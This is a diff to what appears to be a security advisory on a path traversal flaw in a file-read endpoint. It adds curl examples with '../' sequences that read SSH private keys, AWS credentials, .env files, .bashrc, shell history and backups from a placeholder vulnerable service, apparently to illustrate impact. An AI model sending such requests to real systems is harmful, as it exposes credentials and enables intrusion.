@@ -12,6 +12,11 @@
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.ssh/id_rsa
    ```
+
+- AWS credential exposure
+   ```bash
+   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.aws/credentials
+   ```
   
 ### Sensitive information used in project can be exposed.
 
@@ -25,14 +30,24 @@
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../app.js
    ```
 
-- .env file exposure
+- Application’s environment variable information exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../.env
    ```
-  
+
 - Backup file exposure
    ```bash
    curl https://[VULNERABLE-SERVICE]/read?filename=../../../../backup/backup.zip
+   ```
+
+- Environment variable exposure
+   ```bash
+   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.bashrc
+   ```
+
+- Command history exposure
+   ```bash
+   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.bash_history
    ```
 
 ## Arbitrary File Modification
